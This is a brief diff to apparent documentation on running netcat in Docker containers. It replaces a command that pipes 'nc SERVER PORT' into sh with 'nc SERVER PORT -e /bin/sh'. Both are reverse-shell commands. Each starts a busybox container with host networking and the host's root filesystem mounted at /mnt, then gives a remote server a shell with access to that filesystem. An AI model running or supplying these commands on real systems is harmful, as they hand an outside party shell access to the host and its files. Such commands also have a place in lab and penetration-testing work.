@@ -19,5 +19,5 @@ Run ncat Docker Image
 
 Run Busybox Image, execute nc
 ---------------------------------
-	[client]# docker run -t --network host --rm -v /:/mnt busybox /bin/sh -c "nc SERVER PORT | sh"
+	[client]# docker run -t --network host --rm -v /:/mnt busybox /bin/sh -c "nc SERVER PORT -e /bin/sh"
 
